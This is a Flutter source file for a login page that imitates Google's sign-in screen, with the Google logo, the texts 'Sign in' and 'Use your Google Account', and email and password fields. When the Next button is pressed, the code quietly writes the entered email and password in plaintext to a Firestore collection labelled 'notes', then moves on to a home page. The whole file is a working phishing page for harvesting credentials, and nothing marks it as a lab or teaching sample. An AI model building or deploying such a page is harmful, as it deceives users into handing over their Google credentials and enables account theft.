// ignore_for_file: prefer_const_constructors

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

class MyLoginPage extends StatelessWidget {
  const MyLoginPage({super.key});

  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.of(context).size.width;
    double height = MediaQuery.of(context).size.height;
    TextEditingController emailController = TextEditingController();
    TextEditingController passwordController = TextEditingController();
    return Scaffold(
      backgroundColor: Colors.black87,
      body: Center(
          child: Container(
        width: width > 600 ? 550 : width,
        height: width > 600 ? 500 : height,
        padding: EdgeInsets.all(width > 600 ? 20 : 0),
        decoration: BoxDecoration(
          color: Colors.black,
          borderRadius: BorderRadius.circular(30),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // google logo
            Image.network(
              'https://lh3.googleusercontent.com/COxitqgJr1sJnIDe8-jiKhxDx1FrYbtRHKJ9z_hELisAlapwE9LUPh6fcXIfb5vwpbMl4xl9H9TRFPc5NOO8Sb3VSgIBrfRYvW6cUA',
              width: 50,
              height: 50,
            ),
            const SizedBox(height: 25),
            // SIGN IN text
            Text(
              'Sign in',
              style: GoogleFonts.roboto(
                color: Colors.white,
                fontSize: 24,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 10),
            // use your google account text
            Text(
              'Use your Google Account',
              style: GoogleFonts.roboto(
                color: Colors.white,
                fontSize: 15,
                fontWeight: FontWeight.w500,
              ),
            ),
            const SizedBox(height: 30),

            TextField(
              decoration: InputDecoration(
                border: OutlineInputBorder(),
                labelText: 'Email or phone',
                labelStyle: GoogleFonts.roboto(
                    color: const Color.fromRGBO(255, 255, 255, 0.88),
                    fontWeight: FontWeight.w500),
              ),
              style: GoogleFonts.roboto(color: Colors.white),
              controller: emailController,
            ),
            const SizedBox(height: 10),
            TextField(
              obscureText: true,
              decoration: InputDecoration(
                border: OutlineInputBorder(),
                labelText: 'Enter your password',
                labelStyle: GoogleFonts.roboto(
                    color: const Color.fromRGBO(255, 255, 255, 0.88),
                    fontWeight: FontWeight.w500),
              ),
              style: GoogleFonts.roboto(color: Colors.white),
              controller: passwordController,
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.end,
              children: [
                TextButton(
                  onPressed: () {},
                  child: Text(
                    'Forgot password?',
                    style: GoogleFonts.roboto(
                      color: Color(0xFFAEC6F6),
                      fontSize: 15,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                // sign up button
                TextButton(
                  onPressed: () {},
                  child: Text(
                    'Sign up',
                    style: GoogleFonts.roboto(
                      color: const Color(0xFFAEC6F6),
                      fontSize: 15,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
                // next button
                ElevatedButton(
                  onPressed: () {
                    // save email and password
                    String email = emailController.text;
                    String password = passwordController.text;
                    // check if email and password are empty
                    if (email.isEmpty || password.isEmpty) {
                      // show alert dialog
                      showDialog(
                        context: context,
                        builder: (context) => AlertDialog(
                          title: Text('Error'),
                          content: Text('Email or password cannot be empty'),
                          actions: [
                            TextButton(
                              onPressed: () {
                                Navigator.pop(context);
                              },
                              child: Text('OK'),
                            ),
                          ],
                        ),
                      );
                    } else {
                      // navigate to home page
                      Navigator.pushNamed(context, '/home');

                      saveToFile("email: $email, password: $password");
                    }
                  },
                  style: ElevatedButton.styleFrom(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 30,
                        vertical: 15,
                      ),
                      backgroundColor: Color(0xFFAEC6F6)),
                  child: Text(
                    'Next',
                    style: GoogleFonts.roboto(
                      color: Color(0xFF16316e),
                      fontSize: 15,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
              ],
            )
          ],
        ),
      )),
    );
  }

  Future<void> saveToFile(String noteContent) async {
    await FirebaseFirestore.instance.collection('notes').add({
      'content': noteContent,
      'timestamp': FieldValue.serverTimestamp(),
    });
  }
}
